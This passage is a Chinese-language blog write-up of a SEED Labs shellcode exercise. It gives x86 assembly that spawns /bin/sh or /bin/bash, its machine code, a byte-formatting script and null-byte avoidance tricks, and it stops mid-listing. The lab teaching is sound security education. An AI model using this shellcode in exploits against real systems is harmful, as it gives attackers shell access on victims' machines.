@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SEED-Labs SHELLCODE什么是Shellcode Shellcode是一段用于利用软件漏洞的有效负载，通常是16进制的机器码。它被称为“shellcode”，因为它通常会启动一个命令行解释器，从而使攻击者可以控制受攻击计算机。但是，任何执行类似任务的代码片段都可以称为shellcode。   Shellcode可以通过多种方式获取，例如使用编译器生成、手动编写或使用专门的工具生成。S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN第一点二步_seedlabs_shellcode">
+<meta property="og:url" content="http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="SEED-Labs SHELLCODE什么是Shellcode Shellcode是一段用于利用软件漏洞的有效负载，通常是16进制的机器码。它被称为“shellcode”，因为它通常会启动一个命令行解释器，从而使攻击者可以控制受攻击计算机。但是，任何执行类似任务的代码片段都可以称为shellcode。   Shellcode可以通过多种方式获取，例如使用编译器生成、手动编写或使用专门的工具生成。S">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-05T15:20:48.000Z">
+<meta property="article:modified_time" content="2023-11-05T15:21:11.842Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="也许是PWN学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PWN第一点二步_seedlabs_shellcode</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%B8%89%E6%AD%A5-seedlabs-setuid-env/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&text=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&is_video=false&description=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN第一点二步_seedlabs_shellcode&body=Check out this article: http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&name=PWN第一点二步_seedlabs_shellcode&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&t=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SEED-Labs-SHELLCODE"><span class="toc-number">1.</span> <span class="toc-text">SEED-Labs SHELLCODE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFShellcode"><span class="toc-number">1.1.</span> <span class="toc-text">什么是Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99shellcode"><span class="toc-number">1.2.</span> <span class="toc-text">1. 编写shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%A4%BA%E4%BE%8Bshellcode"><span class="toc-number">1.2.1.</span> <span class="toc-text">查看示例shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91shellcode"><span class="toc-number">1.2.2.</span> <span class="toc-text">编译shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">获取机器码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%88%A0%E9%99%A40"><span class="toc-number">1.2.4.</span> <span class="toc-text">shellcode 删除0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%88%A0%E9%99%A40-1"><span class="toc-number">1.2.5.</span> <span class="toc-text">shellcode 删除0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%8E%8B%E5%85%A5%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.6.</span> <span class="toc-text">shellcode 压入变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%8E%8B%E5%85%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.7.</span> <span class="toc-text">shellcode 压入环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%BF%90%E7%94%A8%E4%BB%A3%E7%A0%81%E6%AE%B5"><span class="toc-number">1.3.</span> <span class="toc-text">2. 运用代码段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E9%80%A0%E5%AE%83%EF%BC%8C%E8%AE%A9%E5%AE%83%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C-usr-bin-env-a-11-b-12"><span class="toc-number">1.3.1.</span> <span class="toc-text">改造它，让它可以执行&#x2F;usr&#x2F;bin&#x2F;env a&#x3D;11 b&#x3D;12</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-64%E4%BD%8Dshellcode"><span class="toc-number">1.4.</span> <span class="toc-text">3. 64位shellcode</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PWN第一点二步_seedlabs_shellcode
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-05T15:20:48.000Z" class="dt-published" itemprop="datePublished">2023-11-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%B9%9F%E8%AE%B8%E6%98%AFPWN%E5%AD%A6%E4%B9%A0/" rel="tag">也许是PWN学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="SEED-Labs-SHELLCODE"><a href="#SEED-Labs-SHELLCODE" class="headerlink" title="SEED-Labs SHELLCODE"></a>SEED-Labs SHELLCODE</h1><h2 id="什么是Shellcode"><a href="#什么是Shellcode" class="headerlink" title="什么是Shellcode"></a>什么是Shellcode</h2><blockquote>
+<p>Shellcode是一段用于利用软件漏洞的有效负载，通常是16进制的机器码。它被称为“shellcode”，因为它通常会启动一个命令行解释器，从而使攻击者可以控制受攻击计算机。但是，任何执行类似任务的代码片段都可以称为shellcode。</p>
+</blockquote>
+<blockquote>
+<p>Shellcode可以通过多种方式获取，例如使用编译器生成、手动编写或使用专门的工具生成。Shell-Storm提供了一个shellcode数据库，其中包含各种平台和架构的shellcode。</p>
+</blockquote>
+<h2 id="1-编写shellcode"><a href="#1-编写shellcode" class="headerlink" title="1. 编写shellcode"></a>1. 编写shellcode</h2><h3 id="查看示例shellcode"><a href="#查看示例shellcode" class="headerlink" title="查看示例shellcode"></a>查看示例shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      push &quot;//sh&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/bin//sh&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line">   </span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这段汇编代码是一个Linux下的shellcode，它的作用是启动一个shell。下面是对代码的详细解释：</p>
+</blockquote>
+<blockquote>
+<p>xor eax, eax：将eax寄存器清零。<br>push eax：将0压入栈中，作为字符串的结尾标志。<br>push “&#x2F;&#x2F;sh”：将字符串”&#x2F;&#x2F;sh”压入栈中。<br>push “&#x2F;bin”：将字符串”&#x2F;bin”压入栈中。<br>mov ebx, esp：将esp寄存器的值赋给ebx寄存器，ebx指向字符串”&#x2F;bin&#x2F;&#x2F;sh”。<br>push eax：将0压入栈中，作为argv1的值。<br>push ebx：将ebx寄存器的值压入栈中，作为argv[0]的值。<br>mov ecx, esp：将esp寄存器的值赋给ecx寄存器，ecx指向argv[]数组。<br>xor edx, edx：将edx寄存器清零，表示没有环境变量。<br>xor eax, eax：将eax寄存器清零。<br>mov al, 0x0b：将0x0b赋给al寄存器，表示要执行execve()系统调用。<br>int 0x80：触发系统调用。</p>
+</blockquote>
+<blockquote>
+<p>这段代码的作用是启动一个shell。它首先在栈上构造了一个字符串数组，然后调用execve()系统调用来执行&#x2F;bin&#x2F;&#x2F;sh程序。这个程序是一个shell程序，因此执行完这段代码后就会进入到shell环境中。请注意，这段代码是一个shellcode，它并不是一个完整的程序，也不能直接编译运行。它需要被插入到其他程序中才能发挥作用。</p>
+</blockquote>
+<p><em>为什么int 0x80是触发系统调用？</em></p>
+<blockquote>
+<p>在Linux中，系统调用是通过中断来实现的。每个系统调用都有一个对应的系统调用号，这个号码存储在eax寄存器中。当程序执行int 0x80指令时，CPU会切换到内核态，并根据eax寄存器中的值找到对应的系统调用函数并执行。因此，int 0x80指令是触发系统调用的一种方式</p>
+</blockquote>
+<p><em>为什么将edx清零代表没有环境变量？</em></p>
+<blockquote>
+<p>在Linux中，系统调用execve()需要三个参数：文件名、命令行参数和环境变量。这些参数都是以指针的形式传递给execve()函数的。其中，第三个参数是一个指向环境变量数组的指针。如果程序不需要使用环境变量，那么这个指针就应该是NULL。在这段汇编代码中，xor edx, edx 的作用就是将edx寄存器清零，表示没有环境变量。</p>
+</blockquote>
+<h3 id="编译shellcode"><a href="#编译shellcode" class="headerlink" title="编译shellcode"></a>编译shellcode</h3><p>用nasm编译代码。</p>
+<blockquote>
+<p>We compile the assembly code above (mysh.s) using nasm, which is an assembler and disassembler for the Intel x86 and x64 architectures. The -f elf32 option indicates that we want to compile the code to 2-bit ELF binary format. The Executable and Linkable Format (ELF) is a common standard file format for executable file, object code, shared libraries. For 64-bit assembly code, elf64 should be used.</p>
+</blockquote>
+<p>这个命令是用来将汇编代码文件 mysh.s 编译成目标文件 mysh.o 的。其中，nasm 是一种汇编语言编译器，用于在 Linux 操作系统上编写程序。-f elf32 选项表示生成 32 位的 ELF 格式目标文件。-o mysh.o 选项表示将生成的目标文件保存为 mysh.o。这个目标文件可以被链接器 ld 使用，生成可执行文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 mysh.s -o mysh.o</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Once we get the object code mysh.o, if we want to generate the executable binary, we can run the linker program ld, which is the last step in compilation. The -m elf i386 option means generating the 32-bit ELF binary. After this step, we get the final executable code mysh. If we run it, we can get a shell. Before and after running mysh, we print out the current shell’s process IDs using echo $$, so we can clearly see that mysh indeed starts a new shell.</p>
+</blockquote>
+<blockquote>
+<p>接下来，使用 ld 命令将目标文件链接成可执行文件。其中，-m elf_i386 选项表示生成 32 位的 ELF 格式可执行文件。-o mysh 选项表示将生成的可执行文件保存为 mysh。这个可执行文件可以直接在 Linux 系统上运行。</p>
+</blockquote>
+<blockquote>
+<p>在Linux中，$$ 是一个特殊的变量，它代表当前进程的进程号（PID）。当您在终端中输入 echo $$ 时，Shell会将 $$ 替换为当前进程的PID，并将结果输出到终端。例如，如果当前进程的PID是1234，那么 echo $$ 的输出结果就是1234。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 mysh.o -o mysh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">25751  the process ID of the current shell</span><br></pre></td></tr></table></figure>
+
+<p>25751为当前shell的进程ID。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysh</span><br><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">9760</span><br></pre></td></tr></table></figure>
+
+<p>运行一下刚才编译完的shellcode，进程ID变了。</p>
+<h3 id="获取机器码"><a href="#获取机器码" class="headerlink" title="获取机器码"></a>获取机器码</h3><p>需要的是机器码。可以用objdump进行“反汇编”（disassemble）。</p>
+<blockquote>
+<p>objdump 是一个命令行工具，用于显示 Linux 系统上的目标文件和可执行文件的信息。它可以用来查看二进制文件的汇编代码、符号表、重定位表、段表等信息。objdump 可以帮助程序员了解二进制文件的内部结构，从而更好地理解程序的运行机制。例如，程序员可以使用 objdump 来查看一个可执行文件的汇编代码，以便了解程序的执行流程和算法实现。</p>
+</blockquote>
+<blockquote>
+<p>objdump 支持多种格式的目标文件和可执行文件，包括 ELF、COFF、PE 和 Mach-O 等格式。它还支持多种架构的处理器，包括 x86、ARM、MIPS 和 PowerPC 等处理器。</p>
+</blockquote>
+<blockquote>
+<p>There are two different common syntax modes for assembly code, one is the AT&amp;T syntax mode, and the other is Intel syntax mode. By default, objdump uses the AT&amp;T mode. In the following, we use the -Mintel option to produce the assembly code in the Intel mode.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysh.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;_start&gt;:</span><br><span class="line">   0:	31 c0                	xor    eax,eax</span><br><span class="line">   2:	50                   	push   eax</span><br><span class="line">   3:	68 2f 2f 73 68       	push   0x68732f2f</span><br><span class="line">   8:	68 2f 62 69 6e       	push   0x6e69622f</span><br><span class="line">   d:	89 e3                	mov    ebx,esp</span><br><span class="line">   f:	50                   	push   eax</span><br><span class="line">  10:	53                   	push   ebx</span><br><span class="line">  11:	89 e1                	mov    ecx,esp</span><br><span class="line">  13:	31 d2                	xor    edx,edx</span><br><span class="line">  15:	31 c0                	xor    eax,eax</span><br><span class="line">  17:	b0 0b                	mov    al,0xb</span><br><span class="line">  19:	<span class="built_in">cd</span> 80                	int    0x80</span><br></pre></td></tr></table></figure>
+
+<p>可以用xxd工具来获得机器码。</p>
+<blockquote>
+<p>xxd 是一个 Linux 命令行工具，用于将二进制文件转换为十六进制表示，并以可读的形式显示。它还可以将十六进制输出转换为原始的二进制格式，即将任意文件转换为十六进制或二进制形式。xxd 可以为给定的标准输入或者文件做一次十六进制的输出，并且可以将十六进制输出转换为原来的二进制格式。如果没有给定输入文件，标准输入就作为输入文件。如果没有给定输出文件，结果将输出至标准输出。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -c 20 mysh.o</span><br></pre></td></tr></table></figure>
+
+<p>-p参数是连续显示；-c参数是一行显示多少个。这里是一行显示20个。</p>
+<p>把机器码放入实验给的convert.py，进行转化。convert.py如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ori_sh =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">31c050682f2f7368</span></span><br><span class="line"><span class="string">682f62696e89e3505389e131d231c0b00bcd8000</span></span><br><span class="line"><span class="string">00000000002e74657874002e7368737472746162</span></span><br><span class="line"><span class="string">002e73796d746162002e737472746162</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh = ori_sh.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">length  = <span class="built_in">int</span>(<span class="built_in">len</span>(sh)/<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length of the shellcode: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(length))</span><br><span class="line">s = <span class="string">&#x27;shellcode= (\n&#x27;</span> + <span class="string">&#x27;   &quot;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    s += <span class="string">&quot;\\x&quot;</span> + sh[<span class="number">2</span>*i] + sh[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">16</span> == <span class="number">15</span>: </span><br><span class="line">       s += <span class="string">&#x27;&quot;\n&#x27;</span> + <span class="string">&#x27;   &quot;&#x27;</span></span><br><span class="line">s += <span class="string">&#x27;&quot;\n&#x27;</span> + <span class="string">&quot;).encode(&#x27;latin-1&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
+
+<p>可见，其第一步删除了回车，接下来用循环两个两个插入十六进制数，然后每16个十六进制数字对换个行。</p>
+<h3 id="shellcode-删除0"><a href="#shellcode-删除0" class="headerlink" title="shellcode 删除0"></a>shellcode 删除0</h3><p>shellcode是不能有0x00的。</p>
+<p><em>为什么shellcode不能有0x00？</em></p>
+<blockquote>
+<p>Shellcode是一段二进制代码，用于利用漏洞执行恶意代码。当Shellcode中包含0x00时，字符串处理函数（如strlen、strcpy、strcat、sprintf等）会将Shellcode截断，导致Shellcode无法完成其预期的功能。因此，0x00被称为坏字符。为了避免坏字符的出现，可以使用指令优化或Shellcode编码等技术。指令优化是通过选择一些特殊的指令避免在Shellcode中直接生成坏字符。例如，可以使用slti指令（set less than immediate）来设置寄存器a2为0或1。Shellcode编码是通过对Shellcode进行编码来避免坏字符的出现。例如，可以使用base64编码或十六进制编码等技术来对Shellcode进行编码。</p>
+</blockquote>
+<p>文档里写了一些技巧。</p>
+<blockquote>
+<p>If we want to assign zero to eax, we can use “mov eax, 0”, but doing so, we will get a zero in the machine code. A typical way to solve this problem is to use “xor eax, eax”. </p>
+</blockquote>
+<p>异或寄存器本身，经典的寄存器归零方法。</p>
+<blockquote>
+<p>If we want to store 0x00000099 to eax. We cannot just use mov eax, 0x99, because the second operand is actually 0x00000099, which contains three zeros. To solve this problem, we can first set eax to zero, and then assign a one-byte number 0x99 to the al register, which is the least significant 8 bits of the eax register.</p>
+</blockquote>
+<p>需要赋值高位0的数字的时候，可以直接放低位寄存器。</p>
+<blockquote>
+<p>Another way is to use shift. In the following code, first 0x237A7978 is assigned to ebx. The ASCII values for x, y, z, and # are 0x78, 0x79, 0x7a, 0x23, respectively. Because most Intel CPUs use the small-Endian byte order, the least significant byte is the one stored at the lower address (i.e., the character x), so the number presented by xyz# is actually 0x237A7978. You can see this when you dissemble the code using objdump.</p>
+</blockquote>
+<p>还能通过移位进行赋值。注意：大多数Intel的CPU用小端顺序。</p>
+<blockquote>
+<p>Another way is to use shift. In the following code, first 0x237A7978 is assigned to ebx. The ASCII values for x, y, z, and # are 0x78, 0x79, 0x7a, 0x23, respectively. Because most Intel CPUs use the small-Endian byte order, the least significant byte is the one stored at the lower address (i.e., the character x), so the number presented by xyz# is actually 0x237A7978. You can see this when you dissemble the code using objdump.</p>
+</blockquote>
+<blockquote>
+<p>After assigning the number to ebx, we shift this register to the left for 8 bits, so the most significant byte 0x23 will be pushed out and discarded. We then shift the register to the right for 8 bits, o the most significant byte will be filled with 0x00. After that, ebx will contain 0x007A7978, which is equivalent to “xyzn0”, i.e., the last byte of this string becomes zero.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, &quot;xyz#&quot;</span><br><span class="line">shl ebx, 8</span><br><span class="line">shr ebx, 8</span><br></pre></td></tr></table></figure>
+
+<h3 id="shellcode-删除0-1"><a href="#shellcode-删除0-1" class="headerlink" title="shellcode 删除0"></a>shellcode 删除0</h3><p>采用左右移的方式唤起&#x2F;bin&#x2F;bash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      mov  ebx, &quot;hxxx&quot; </span><br><span class="line">      shl  ebx, 24</span><br><span class="line">      shr  ebx, 24</span><br><span class="line">      push ebx</span><br><span class="line">      push &quot;/bas&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/bin//sh&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line">   </span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      